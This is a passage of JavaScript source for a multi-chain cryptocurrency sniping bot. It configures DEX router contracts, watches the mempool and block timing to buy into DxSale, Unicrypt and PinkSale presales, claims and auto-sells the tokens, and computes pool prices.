          'function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline) external payable returns (uint[] memory amounts)',
          'function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline) external payable returns (uint[] memory amounts)',
          'function swapTokensForExactTokens(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline) external payable returns (uint[] memory amounts)'
        ],
        account
      );

      sellRouterTarget = new ethers.Contract(
        routerAddress,
        [
          'function getAmountsOut(uint amountIn, address[] memory path) public view returns (uint[] memory amounts)',
          'function swapExactTokensForETHSupportingFeeOnTransferTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external returns (uint[] memory amounts)',
          'function swapExactTokensForTokensSupportingFeeOnTransferTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external returns (uint[] memory amounts)'
        ],
        account
      );
    }
  } else if (choseBlockChain == 3) {
    contract = process.env.swapContractPOLYGON;
    marketName = "QuickSwap";
    routerAddress = polygon.quickswap_router;
    routerAbi = contractAbi.polygonRouter;
    if (choseMethode == 1) {
      curency = "MATTIC";
    } else {
      curency = "WMATTIC";
    }

    ETHER = polygon.wmaticErc721;
    buyRouterTarget = new ethers.Contract(
      routerAddress,
      ['function swapExactTokensForTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external returns (uint[] memory amounts)',
        'function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline) external payable returns (uint[] memory amounts)',
        'function swapETHForExactTokens(uint amountOut, address[] path, address to, uint deadline) external payable returns (uint[] memory amounts)',
        'function swapTokensForExactTokens(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline) external payable returns (uint[] memory amounts)'
      ],
      account
    );
    sellRouterTarget = new ethers.Contract(
      routerAddress,
      [
        'function getAmountsOut(uint amountIn, address[] memory path) public view returns (uint[] memory amounts)',
        'function swapExactTokensForETHSupportingFeeOnTransferTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external returns (uint[] memory amounts)',
        'function swapExactTokensForTokensSupportingFeeOnTransferTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external returns (uint[] memory amounts)'
      ],
      account
    );
  } else if (choseBlockChain == 4) {
    contract = process.env.swapContractCRONOS;
    marketName = "MM Finance";
    routerAddress = cronos.mmfinance_router;
    routerAbi = contractAbi.cronosRouter;
    if (choseMethode == 1) {
      curency = "CRO";
    } else {
      curency = "WCRO";
    }

    ETHER = cronos.wcrocrc20;
    buyRouterTarget = new ethers.Contract(
      routerAddress,
      ['function swapExactTokensForTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external returns (uint[] memory amounts)',
        'function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline) external payable returns (uint[] memory amounts)',
        'function swapETHForExactTokens(uint amountOut, address[] path, address to, uint deadline) external payable returns (uint[] memory amounts)',
        'function swapTokensForExactTokens(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline) external payable returns (uint[] memory amounts)'
      ],
      account
    );
    sellRouterTarget = new ethers.Contract(
      routerAddress,
      [
        'function getAmountsOut(uint amountIn, address[] memory path) public view returns (uint[] memory amounts)',
        'function swapExactTokensForETHSupportingFeeOnTransferTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external returns (uint[] memory amounts)',
        'function swapExactTokensForTokensSupportingFeeOnTransferTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external returns (uint[] memory amounts)'
      ],
      account
    );
  }

  contractRouter = new ethers.Contract(
    contract,
    [
      'function TradeMultipleFee(address _tokenIn, address _tokenOut , uint256 _amountIn, uint _transCount, address _to, uint _router)',
      'function TradeMultiple(address _tokenIn, address _tokenOut , uint256 _amountIn, uint256 _amountOutMin, uint _transCount, address _to, uint _router)',
      'function TradeExactMultipleFee(uint amountOutOriginal, address[] calldata path, address to, uint _transCount, uint _router) external returns (uint[] memory amounts)',
      'function TradeExactMultipleWallets(uint amountOutOriginal, address[] calldata path, address[] memory to, uint _router) external returns (uint[] memory amounts)',
      'function Withdraw(address _token, uint _router)',
      'function getPairAddress(address _tokenIn, address _tokenOut, uint _router)',
      'function TradeMultipleWalletsFee(address _tokenIn, address _tokenOut , uint256 _amountIn, address[] memory _to, uint _router)',
      'function approve(address spender, uint256 amount) external returns (bool)'
    ],
    account
  );

  provider.removeAllListeners();


}
x = 0;
//mode 9

walletAddress = process.env.ownerWallet;

let dataArgsMode9;
let tokenDetailsMode9;
let tokenABITraker;
let responseData;
let pairLiquidityValue;
let dataArray = [];
let tokenDetails;
let contractSource;
let abiSource;
let functionsDetected = [];
let contractLineByLine = [];
let keywords = []
let firstConnection = 0;

async function claimPresaleTokens() {
  let tokenBalanceFromPresale = zeroValue;
  let valueZero = ethers.utils.parseUnits('0', 'ether');
  let presaleCurency = parseInt(process.env.presaleCurency);
  if (presaleCurency == 1) {
    presaleEther = bsc.wbnbBep20;
  } else {
    presaleEther = bsc.busdBep20;
  }
  let claimGasPrice = ethers.utils.parseUnits('6', 'gwei')
  let claimGasLimit = 700000;
  confirmedPuchase = false;
  let waitForListing = true;
  let confirmSell = false;
  let tradingPair = await getPair(presaleEther, TokenContract)
  console.log("Waiting to claim tokens from presale ....")
  currentNonce = await account.getTransactionCount();
  if (confirmSell == false && confirmedPuchase == false) {
    if (selectPresale == 3) {
      provider.on("pending", async (tx) => {
        const transaction = await provider.getTransaction(tx)
        if (transaction != null && transaction.to != null && confirmedPuchase == false && waitForListing == true) {

          if (transaction['data'].includes('0x4bb278f3') && transaction.to.toLowerCase() == presale_address.toLowerCase()) {
            confirmedPuchase = true;
            waitForListing = false;
          } else {
            pairLiquidityValue = await getTokenBalance(presaleEther, tradingPair, provider)
            if (pairLiquidityValue.gt(zeroValueX)) {
              confirmedPuchase = true;
              waitForListing = false;
            }
          }

          if (confirmedPuchase == true) {
            consoleLog(chalk.red(`PinkSale Claim triggered.`));
            let txParams = {
              nonce: currentNonce,
              gasLimit: claimGasLimit,
              gasPrice: claimGasPrice,
              chainId: 56,
              value: valueZero,
              to: presale_address,
              data: 0x4e71d92d
            };

            try {
              transactionRaw = await account.signTransaction(txParams, currentNonce);
              console.log('Claiming....')
              snipeIt = await provider.sendTransaction(transactionRaw);
              snipeResult = await snipeIt.wait();
              await new Promise(r => setTimeout(r, 800));
              console.log("Claim was successfull!!");
              provider.removeAllListeners();
              confirmSell = true;
            } catch (error) {
              console.log("Claim failed!!!");
              await new Promise(r => setTimeout(r, 400));
              process.exit(0);
            };
            if (instantSell == true && choseMode == 1 && confirmSell == true) {

              confirmSell == false;
              await sellFromPresale();

            } else {
              process.exit(0)
            }
          }
        }
      });
    }


    if (selectPresale != 3) {

      while (waitForListing) {

        pairLiquidityValue = await getTokenBalance(presaleEther, tradingPair, provider)
        if (pairLiquidityValue.gt(zeroValue)) {
          confirmedPuchase = true;
          waitForListing = false;
        }

      }

      if (confirmedPuchase == true) {
        if (selectPresale == 1) {
          consoleLog(chalk.red(`DxSale Claim triggered.`));
          const presaleContract = new ethers.Contract(
            presale_address,
            [
              'function claimTokens() nonpayable',
            ],
            account,
          );

          try {
            const tx = await presaleContract.claimTokens({
              gasLimit: claimGasLimit, gasPrice: claimGasPrice, nonce: currentNonce
            });
            const receipt = await tx.wait();
            console.log(`Successfully claimed the tokens!`);
            confirmSell = true;
          } catch (e) {
            console.log('Failed to claim tokens!')
            process.exit(0)
          }
          if (instantSell == true && choseMode == 1 && confirmSell == true) {

            confirmSell == false;
            await sellFromPresale();

          } else {
            process.exit(0)
          }
        } else if (selectPresale == 2) {
          consoleLog(chalk.red(`Unicrypt Claim triggered.`));
          let txParams = {
            nonce: currentNonce,
            gasLimit: claimGasLimit,
            gasPrice: claimGasPrice,
            chainId: 56,
            value: valueZero,
            to: presale_address,
            data: 0xfe8121de
          };
          try {
            transactionRaw = await account.signTransaction(txParams, currentNonce);
            console.log('Claiming....')
            snipeIt = await provider.sendTransaction(transactionRaw);
            snipeResult = await snipeIt.wait();
            await new Promise(r => setTimeout(r, 800));
            console.log("Claim was successfull!!");
            provider.removeAllListeners();
            confirmSell = true;
          } catch (error) {
            console.log("Claim failed!!!");
            await new Promise(r => setTimeout(r, 400));
            process.exit(0);
          };
          if (instantSell == true && choseMode == 1 && confirmSell == true) {

            confirmSell == false;
            await sellFromPresale();

          } else {
            process.exit(0)
          }
        } else if (selectPresale == 3) {
          consoleLog(chalk.red(`PinkSale Claim triggered.`));
          let txParams = {
            nonce: currentNonce,
            gasLimit: claimGasLimit,
            gasPrice: claimGasPrice,
            chainId: 56,
            value: valueZero,
            to: presale_address,
            data: 0x4e71d92d
          };

          try {
            transactionRaw = await account.signTransaction(txParams, currentNonce);
            console.log('Claiming....')
            snipeIt = await provider.sendTransaction(transactionRaw);
            snipeResult = await snipeIt.wait();
            await new Promise(r => setTimeout(r, 800));
            console.log("Claim was successfull!!");
            provider.removeAllListeners();
            confirmSell = true;
          } catch (error) {
            console.log("Claim failed!!!");
            await new Promise(r => setTimeout(r, 400));
            process.exit(0);
          };
          if (instantSell == true && choseMode == 1 && confirmSell == true) {

            confirmSell == false;
            await sellFromPresale();

          } else {
            process.exit(0)
          }

        } else {
          consoleLog(chalk.magenta("Wrong presale option triggered... exiting!"));
          process.exit(0)
        }
      }

    }

  } else {

  }

}



async function sellFromPresale() {
  tokenInfoCall = new web3.eth.Contract(tokenInfoABI, TokenContract);

  tokenInfoDecimals = await tokenInfoCall.methods.decimals().call();
  tokenDecimals = tokenInfoDecimals;
  tokenInfoName = await tokenInfoCall.methods.name().call();
  tokenInfoSymbol = await tokenInfoCall.methods.symbol().call();
  totalInfoSupply = await tokenInfoCall.methods.totalSupply().call();
  Infosupply = ethers.BigNumber.from(totalInfoSupply);
  balance = await getTokenBalance(TokenContract, myAddress, provider);
  currentNonce = await account.getTransactionCount();
  consoleLog(chalk.green(`Total Token balance is ${chalk.yellow(parseFloat(ethers.utils.formatUnits(balance, tokenDecimals)).toFixed(6))}\n`))
  if (needApproval == true && approveBeforeOrAfter == 2) {
    await startApprove();
  }

  if (instantSell) {
    if (sellAuto) {
      if (delaySell > 0) {
        if (antiRugActive) {
          if (sellFunctionHash.includes('0x')) {
            //console.log('its hashed!')
            functionToDetect = sellFunctionHash;
          } else {
            functionToDetect = getHashForFunction(sellFunctionHash);
            // console.log(functionToDetect);
          }
          await antiScam();
        } else {
          await sellFromWallet();
        }
      } else {
        await sellFromWallet();
      }

    } else {
      if (antiRugActive) {
        await antiScam();
      } else {
        tokenPriceStart = await getTokenPrice(tokenAddress, provider);
        startingPriceValue = parseFloat(process.env.presale_bnb_amount).toFixed(8);
        await detectPriceValue(tokenAddress, provider, balance, tokenDecimals, tokenInfoSymbol, startingPriceValue);
      }
    }

  } else {
    if (antiRugActive) {
      await antiScam();
    } else {
      process.exit(0)
    }
  }

}

async function sellOnlyMode() {
  if (choseMethode == 1 && passed == 1) {
    if (confirmedPuchase) {
      passed = 2;
      if (instantSell) {
        if (sellAuto) {
          if (delaySell > 0) {
            if (antiRugActive) {
              await antiScam();
            } else {
              await new Promise(r => setTimeout(r, parseInt(delaySell) * 1000))
              await sellFromWallet();
            }
          } else {
            await sellFromWallet();
          }

        } else {
          
          tokenPriceStart = await getTokenPrice(tokenAddress, provider);

          if (snipeExactTokens) {
            startingPriceValue = (parseFloat(process.env.amount_BNB_buy).toFixed(8) * tokenPriceStart)
          } else {
            startingPriceValue = parseFloat(process.env.amount_BNB_buy).toFixed(8);
          }
          await detectPriceValue(tokenAddress, provider, balance, tokenDecimals, tokenInfoSymbol, startingPriceValue);
        }

      } else {
        if (antiRugActive) {
          await antiScam();
        } else {
          process.exit(0)
        }
      }


    }
  } else if (choseMethode == 2 && passed == 1) {
    if (confirmedPuchase) {
      passed = 2;
      if (instantSell) {
        if (sellAuto) {
          if (delaySell > 0) {
            if (antiRugActive) {
              await antiScam()
            } else {
              await new Promise(r => setTimeout(r, parseInt(delaySell) * 1000))
              await sellFromWallet()
            }
          } else {
            await sellFromWallet()
          }

        } else {
          tokenPriceStart = await getTokenPrice(tokenAddress, provider);
          if (snipeExactTokens) {
            startingPriceValue = (parseFloat(process.env.amount_BNB_buy).toFixed(8) * tokenPriceStart)
          } else {
            startingPriceValue = parseFloat(process.env.amount_BNB_buy).toFixed(8);
          }
          await detectPriceValue(tokenAddress, provider, balance, tokenDecimals, tokenInfoSymbol, startingPriceValue);
        }

      } else {
        if (antiRugActive) {
          await antiScam();
        } else {
          process.exit(0)
        }
      }


    }


  } else if (choseMethode == 3 && passed == 1) {
    if (confirmedPuchase) {
      passed = 2;
      if (instantSell) {
        if (sellAuto) {
          if (delaySell > 0) {
            if (antiRugActive) {
              await antiScam();
            } else {
              await new Promise(r => setTimeout(r, parseInt(delaySell) * 1000))
              await sellFromContract();
              if (choseMode == 3) {
                consoleLog(chalk.green(`Waiting for targeted transaction on mempool...\n`))
                passed = 0;
              } else {
                process.exit(0)
              }
            }
          } else {
            await sellFromContract();
            if (choseMode == 3) {
              consoleLog(chalk.green(`Waiting for targeted transaction on mempool...\n`))
              passed = 0;
            } else {
              process.exit(0)
            }
          }

        } else {
          tokenPriceStart = await getTokenPrice(tokenAddress, provider);
          if (snipeExactTokens) {
            startingPriceValue = (parseFloat(process.env.amount_BNB_buy).toFixed(8) * tokenPriceStart)
          } else {
            startingPriceValue = parseFloat(process.env.amount_BNB_buy).toFixed(8);
          }
          await detectPriceValue(TokenContract, provider, balance, tokenDecimals, tokenInfoSymbol, startingPriceValue);
        }

      } else {
        if (antiRugActive) {
          await antiScam();
        } else {
          process.exit(0)
        }
      }
    }
  } else {
    process.exit(0)
  }
}
//get Nounce function:
async function getNonce(addr) {
  const nonce = await provider.getTransactionCount(addr)
  return nonce
}

async function snipeDxSaleStart(presaleAddress, bnb_amount, signer) {
  let presaleInfo;
  let currentNonce = await signer.getTransactionCount();
  consoleLog('Your current nounce is: ' + currentNonce);
  try {
    consoleLog(chalk.green(`Start getting presale information...`));
    presaleInfo = await getDxsalePresaleInfoFromContract(presaleAddress, provider);
    consoleLog('Presale address   : ' + chalk.green(presaleAddress));
    consoleLog('Token name        : ' + chalk.green(`${presaleInfo.symbol} | ${presaleInfo.name}`));
    consoleLog('Token address     : ' + chalk.green(presaleInfo.tokenAddress));
    consoleLog('Presale starts at : ' + chalk.green(new Date(presaleInfo.startTimeStamp * 1000)));
    consoleLog('Minimum deposit   : ' + chalk.green(presaleInfo.minDeposit) + ' BNB');
    consoleLog('Maximum deposit   : ' + chalk.green(presaleInfo.maxDeposit) + ' BNB');
    consoleLog('Soft cap          : ' + chalk.green(presaleInfo.softCap) + ' BNB');
    consoleLog('Hard cap          : ' + chalk.green(presaleInfo.hardCap) + ' BNB');
    consoleLog('Pcs liquidity %   : ' + chalk.green(presaleInfo.PancakeSwapLiquidity) + ' %')
    ownerAddress = presaleInfo.ownerAddress;
    let flag = false;
    startBlock = await provider.getBlock();

    if (startBlock.timestamp > presaleInfo.startTimeStamp) {
      if (presaleSarted) {

        if (whiteListActive) {
          flag = true;
          provider.on('pending', async (txHash) => {
            const tx = await provider.getTransaction(txHash);
            if (flag && tx && tx.from == ownerAddress && tx.to == '0x7100c01f668a5B407dB6A77821DDB035561F25B8' && tx.data == '0xd6b0f484') {
              flag = false;
              consoleLog(chalk.green('Whitelist ended, waiting 10 minutes for cooldown to end!'));
              await new Promise(r => setTimeout(r, 600000))
              consoleLog(chalk.green('Going to snipe ' + presaleAddress + ' with ' + bnb_amount + ' BNB and ' + gas_price + ' gwei'));
              await new Promise(r => setTimeout(r, 400))
              const depositAmount = ethers.utils.parseEther(bnb_amount);
              const snipetx = await signer.sendTransaction({
                to: presaleAddress,
                value: depositAmount,
                gasLimit: dXgasLimit, gasPrice: tx.gasPrice, nonce: currentNonce
              });
              consoleLog('Start buying token with ' + chalk.green(bnb_amount) + ' BNB...');
              await snipetx.wait();
              consoleLog(`Successfully bought the token, check your transaction here`);
              consoleLog(chalk.green(`https://` + chainScanner + `/tx/${tx.hash}`))
              if (claimTokens) {
                console.log("Waiting for presale to be listed and claim tokens...");
                await claimPresaleTokens();
              }
            }
          });
        } else {
          consoleLog(chalk.green(`Going to snipe ${presaleAddress} with ${bnb_amount} BNB and ${gas_price} gwei`));
          flag = false;
          consoleLog('Start buying token with ' + chalk.green(bnb_amount) + ' BNB...');
          try {
            const depositAmount = ethers.utils.parseEther(bnb_amount);
            const tx = await signer.sendTransaction({
              to: presaleAddress,
              value: depositAmount,
              gasLimit: dXgasLimit, gasPrice: dXgasPrice, nonce: currentNonce
            });
            await tx.wait();
            consoleLog(`Successfully bought the token, check your transaction here`);
            consoleLog(chalk.green(`https://` + chainScanner + `/tx/${tx.hash}`));
            if (claimTokens) {
              console.log("Waiting for presale to be listed and claim tokens...");
              await claimPresaleTokens();
            }
          } catch (e) {
            consoleLog(chalk.red(`Failed, could not contribute...`));
            process.exit();
          }

        }
      } else {
        consoleLog(chalk.red(`Failed, presale already started, exiting...`));
        process.exit();
      }

    }

    if (whiteListActive) {
      consoleLog('Waiting for whitelist part of the presale to end!')
      flag = true;
      provider.on('pending', async (txHash) => {
        const tx = await provider.getTransaction(txHash);
        if (flag && tx && tx.from == ownerAddress && tx.to == '0x7100c01f668a5B407dB6A77821DDB035561F25B8' && tx.data == '0xd6b0f484') {
          flag = false;
          consoleLog();
          consoleLog(chalk.green('Whitelist ended, waiting 10 minutes for cooldown to end!'));
          await new Promise(r => setTimeout(r, 600000))
          consoleLog(chalk.green('Going to snipe ' + presaleAddress + ' with ' + bnb_amount + ' BNB and ' + gas_price + ' gwei'));
          consoleLog();
          await new Promise(r => setTimeout(r, 400))
          const depositAmount = ethers.utils.parseEther(bnb_amount);
          const snipetx = await signer.sendTransaction({
            to: presaleAddress,
            value: depositAmount,
            gasLimit: dXgasLimit, gasPrice: tx.gasPrice, nonce: currentNonce
          });
          consoleLog('Start buying token with ' + chalk.green(bnb_amount) + ' BNB...');
          await snipetx.wait();
          consoleLog(`Successfully bought the token, check your transaction here`);
          consoleLog(chalk.green(`https://` + chainScanner + `/tx/${tx.hash}`))
          if (claimTokens) {
            console.log("Waiting for presale to be listed and claim tokens...");
            await claimPresaleTokens();
          }
        }
      });
    } else {
      consoleLog(chalk.green('Going to snipe ' + presaleAddress + ' with ' + bnb_amount + ' BNB and ' + gas_price + ' gwei'));
      consoleLog(chalk.yellow(`Waiting for countdown to reach 0...`));
      provider.on("block", async (blockNumber) => {
        if (flag) {
          flag = false;
          const depositAmount = ethers.utils.parseEther(bnb_amount);
          const tx = await signer.sendTransaction({
            to: presaleAddress,
            value: depositAmount,
            gasLimit: dXgasLimit, gasPrice: dXgasPrice, nonce: currentNonce
          });
          consoleLog('Start buying token with ' + chalk.green(bnb_amount) + ' BNB...');
          await tx.wait();
          consoleLog(`Successfully bought the token, check your transaction here`);
          consoleLog(chalk.green(`https://` + chainScanner + `/tx/${tx.hash}`))
          if (claimTokens) {
            console.log("Waiting for presale to be listed and claim tokens...");
            await claimPresaleTokens();
          }
        }
        const block = await provider.getBlock(blockNumber);
        const avgBlockTime = (block.timestamp - startBlock.timestamp) / (blockNumber - startBlock.number);
        if ((block.timestamp < presaleInfo.startTimeStamp - avgBlockTime * 2) && (block.timestamp >= presaleInfo.startTimeStamp - avgBlockTime * 3)) {
          flag = true;
        }
      });
    }


  } catch (e) {
    consoleLog('Something went wrong, exiting...');
    consoleLog(e);
    processExit();
  }

}

async function getDxsalePresaleInfoFromContract(presaleAddress, provider) {
  const deployerContract = new ethers.Contract(
    '0x7100c01f668a5B407dB6A77821DDB035561F25B8',
    [
      'function presaleAddrToOwnerAddr(address) view returns (address)',
      'function presaleOwnerToIndex(address) view returns (uint256)',
      'function presales(address) view returns (bool exists, uint256 createdOn, address presaleInfoAddr, address tokenAddress, address presaleAddress, address governor, bool active, uint256 startTime, uint256 endTime, uint256 govPercentage, address uniswapDep, uint256 uniswapPercentage, uint256 uniswapRate, uint256 lp_locked)',
    ],
    provider
  );
  const ownerAddress = await deployerContract.presaleAddrToOwnerAddr(presaleAddress);
  const presale = await deployerContract.presales(ownerAddress);
  const presaleContract = new ethers.Contract(
    presaleAddress,
    [
      'function CheckSoftCap() view returns (uint256)',
      'function CheckHardCap() view returns (uint256)',
      'function minEthContribution() view returns (uint256)',
      'function maxEthContribution() view returns (uint256)',
    ],
    provider
  );
  const presaleInfoContract = new ethers.Contract(
    presale.presaleInfoAddr,
    [
      'function infoManager(address) view returns (bool exists, string name, string symbol, string logo, string website, string github, string twitter, string reddit, string telegram, string description, string update)',
    ],
    provider
  );
  const tokenContract = new ethers.Contract(
    presale.tokenAddress,
    [
      'function name() view returns (string)',
      'function symbol() view returns (string)',
    ],
    provider
  );
  let tokenInfo = undefined;
  try {
    tokenInfo = {
      name: await tokenContract.name(),
      symbol: await tokenContract.symbol()
    }
  } catch (e) {
  }
  const info = await presaleInfoContract.infoManager(ownerAddress);
  return {
    ownerAddress: ownerAddress,
    tokenAddress: presale.tokenAddress,
    startTimeStamp: presale.startTime.toNumber(),
    PancakeSwapLiquidity: presale.uniswapPercentage.toNumber(),
    softCap: (await presaleContract.CheckSoftCap()).toNumber(),
    hardCap: (await presaleContract.CheckHardCap()).toNumber(),
    minDeposit: parseFloat(ethers.utils.formatEther(await presaleContract.minEthContribution())),
    maxDeposit: parseFloat(ethers.utils.formatEther(await presaleContract.maxEthContribution())),
    ...tokenInfo
  }
}
//Get token Balance Function:
async function getTokenBalance(tokenAddress, address, provider) {
  const abi = [
    {
      name: 'balanceOf',
      type: 'function',
      inputs: [
        {
          name: '_owner',
          type: 'address',
        },
      ],
      outputs: [
        {
          name: 'balance',
          type: 'uint256',
        },
      ],
      constant: true,
      payable: false,
    },
  ];

  const contract = new ethers.Contract(tokenAddress, abi, provider)
  var balance = await contract.balanceOf(address)
  return balance
}

async function getMinTokenInfo(address, provider) {
  const tokenContract = new ethers.Contract(
    address,
    bscTokenAbi,
    provider,
  );
  let tokenInfo;
  try {
    const decimals = await tokenContract.decimals()
    tokenInfo = {
      name: await tokenContract.name(),
      symbol: await tokenContract.symbol(),
      decimals: decimals,
      totalSupply: parseInt(ethers.utils.formatUnits(await tokenContract.totalSupply(), decimals))
    }
  } catch (e) {
  } finally {
    return tokenInfo;
  }
}

async function getPresalInfoFromV6(presaleAddress, provider) {
  presaleInfoUni = new ethers.Contract(
    presaleAddress, unicryptAbi,
    provider
  );
  try {
    presaleStatus = await presaleInfoUni.presaleStatus();
  } catch (e) {
    console.log("Please check if the presale address is correct, could not retrive any presale information!")
    process.exit(0)
  }

  presaleInfo = await presaleInfoUni.getInfo();
  if (presaleInfo[1].START_BLOCK == null || presaleInfo[1].START_BLOCK == undefined) {
    console.log("Please check if the presale address is correct, could not retrive any presale information!")
    process.exit(0)
  }
  console.log("------------------------------------")
  console.log("Token Contract: " + presaleInfo[1].S_TOKEN)
  let tokenInfoContract = new ethers.Contract(
    presaleInfo[1].S_TOKEN,
    bscTokenAbi,
    provider,
  );
  let decimalsToken = await tokenInfoContract.decimals();
  let nameToken = await tokenInfoContract.name();
  let symbolToken = await tokenInfoContract.symbol();
  console.log("Price: " + parseFloat(ethers.utils.formatUnits(presaleInfo[1].TOKEN_PRICE, decimalsToken)).toFixed(0) + " " + symbolToken + "/BNB")
  console.log("Max Spend / account: " + parseFloat(ethers.utils.formatUnits(presaleInfo[1].MAX_SPEND_PER_BUYER, 18)).toFixed(2) + " BNB")
  console.log("Total Token Supply in presale: " + parseFloat(ethers.utils.formatUnits(presaleInfo[1].AMOUNT, 18)).toFixed(0) + " " + nameToken)
  console.log("HardCap: " + parseFloat(ethers.utils.formatUnits(presaleInfo[1].HARDCAP, 18)).toFixed(0) + " BNB")
  console.log("SoftCap: " + parseFloat(ethers.utils.formatUnits(presaleInfo[1].SOFTCAP, 18)).toFixed(0) + " BNB")
  console.log("Liquidity: " + presaleInfo[1].LIQUIDITY_PERCENT.toString() / 10 + " %")
  console.log("Listing Rate: " + parseFloat(ethers.utils.formatUnits(presaleInfo[1].LISTING_RATE, 18)).toFixed(0) + " " + symbolToken + "/BNB")
  console.log("Start Block: " + presaleInfo[1].START_BLOCK.toString())
  console.log("End Block: " + presaleInfo[1].END_BLOCK.toString())
  let startBlockTrigger = parseInt(presaleInfo[1].START_BLOCK) - 2;
  return startBlockTrigger;

}


async function getPancakeLiquidityInfo(quoteToken, baseToken, provider) {

  const lpAddress = await getPair(baseToken, quoteToken)
  let lpContract = new ethers.Contract(
    lpAddress,
    pancakeLpAbi,
    provider,
  );
if(choseBlockChain == 2){  
    lpContract = new ethers.Contract(
    lpAddress,
    uniswapLpAbi,
    provider,
  );
}
  

  const quoteTokenInfo = await getMinTokenInfo(quoteToken, provider);
  const baseTokenInfo = await getMinTokenInfo(baseToken, provider);
  let balancequoteToken = await getTokenBalance(quoteToken, lpAddress, provider)
  let balancebaseTokenInfo = await getTokenBalance(baseToken, lpAddress, provider)
  //const reserves2 = await lpContract.getReserves();
  const reserves = [balancequoteToken,balancebaseTokenInfo];


  let quoteTokenReserve;
  let baseTokenReserve;
  const token0 = await lpContract.token0();
  if (token0.toLowerCase() === quoteToken.toLowerCase()) {
    quoteTokenReserve = ethers.utils.formatUnits(reserves[0], quoteTokenInfo.decimals);
    baseTokenReserve = ethers.utils.formatUnits(reserves[1], baseTokenInfo.decimals);
  } else {
    quoteTokenReserve = ethers.utils.formatUnits(reserves[1], quoteTokenInfo.decimals);
    baseTokenReserve = ethers.utils.formatUnits(reserves[0], baseTokenInfo.decimals);
  }

  return {
    quoteToken: {
      ...quoteTokenInfo,
      address: quoteToken,
      reserve: quoteTokenReserve
    },
    baseToken: {
      ...baseTokenInfo,
      address: baseToken,
      reserve: baseTokenReserve
    }
  }
}

async function getConfirmationHash(reciptHash) {
  receipt = await provider.getTransactionReceipt(reciptHash);
  for (wait = 0; wait < 1;) {
    receipt = await provider.getTransactionReceipt(reciptHash);
    if (receipt != null) {
      wait = 1;
      if (receipt.status == 1) {
        return true;
      } else {
        return false;
      }
    }
  }
}

async function getBnbPrice(provider) {
  if (choseBlockChain == 1) {
    bnbBusdLp = await getPancakeLiquidityInfo(bsc.wbnbBep20, bsc.busdBep20, provider);
  } else if (choseBlockChain == 2) {
    bnbBusdLp = await getPancakeLiquidityInfo(eth.wethErc20, eth.usdtErc20, provider);
  } else if (choseBlockChain == 3) {
    bnbBusdLp = await getPancakeLiquidityInfo(polygon.wmaticErc721, polygon.usdtErc721, provider);
  }

  return bnbBusdLp.baseToken.reserve / bnbBusdLp.quoteToken.reserve;
}

async function getTokenPrice2(tokenAddress, provider) {
  if (choseBlockChain == 1) {
    tokenBnbLp = await getPancakeLiquidityInfo(tokenAddress, bsc.wbnbBep20, provider);
  } else if (choseBlockChain == 2) {
    tokenBnbLp = await getPancakeLiquidityInfo(tokenAddress, eth.wethErc20, provider);
  } else if (choseBlockChain == 3) {
    tokenBnbLp = await getPancakeLiquidityInfo(tokenAddress, polygon.wmaticErc721, provider);
  }
  
  bnbPrice = await getBnbPrice(provider);
  return tokenBnbLp.baseToken.reserve / tokenBnbLp.quoteToken.reserve * bnbPrice;

}

async function getTokenPrice(tokenAddress, provider) {

  if (choseBlockChain == 1) {
    if (exchangeToken == 1) {
      exchangeTokenName = 'BNB';
      tokenPairWith = "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c";
    } else if (exchangeToken == 2) {
      exchangeTokenName = 'BUSD';
      tokenPairWith = "0xe9e7cea3dedca5984780bafc599bd69add087d56";
    } else if (exchangeToken == 3) {
      exchangeTokenName = 'USDT';
      tokenPairWith = '0x55d398326f99059fF775485246999027B3197955';
    } else if (exchangeToken == 4) {
      exchangeTokenName = 'USDC';
      tokenPairWith = '0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d';
    } else {

    }
    tokenBnbLp = await getPancakeLiquidityInfo(tokenAddress, tokenPairWith, provider);
    bnbPrice = await getBnbPrice(provider);
    //console.log(tokenBnbLp)
  } else if (choseBlockChain == 2) {

    if (exchangeToken == 1) {
      exchangeTokenName = 'ETH';
      tokenPairWith = "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2";
    } else if (exchangeToken == 2) {
      exchangeTokenName = 'USDT';
      tokenPairWith = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
    } else if (exchangeToken == 3) {
      exchangeTokenName = 'USDC';
      tokenPairWith = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";
    }  else if (exchangeToken == 4) {
      exchangeTokenName = 'DAI';
      tokenPairWith = "0x6B175474E89094C44Da98b954EedeAC495271d0F";
    }else {

    }

    tokenBnbLp = await getPancakeLiquidityInfo(tokenAddress, tokenPairWith, provider);

    bnbPrice = await getBnbPrice(provider);
  } else if (choseBlockChain == 3) {
    if (exchangeToken == 1) {
      exchangeTokenName = 'MATIC';
      tokenPairWith = "0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270";
    } else {

    }

    tokenBnbLp = await getPancakeLiquidityInfo(tokenAddress, tokenPairWith, provider);
    bnbPrice = await getBnbPrice(provider);
  }
  if (exchangeToken == 1) {
    return tokenBnbLp.baseToken.reserve / tokenBnbLp.quoteToken.reserve;
  } else {
    //return tokenBnbLp.baseToken.reserve / tokenBnbLp.quoteToken.reserve * bnbPrice;
    return tokenBnbLp.baseToken.reserve / tokenBnbLp.quoteToken.reserve;
  }

}

async function getTokenPriceScanner(tokenAddress, provider) {
  if (choseBlockChain == 1) {
    exchangeTokenName = 'BUSD';
    tokenPairWith = "0xe9e7cea3dedca5984780bafc599bd69add087d56";
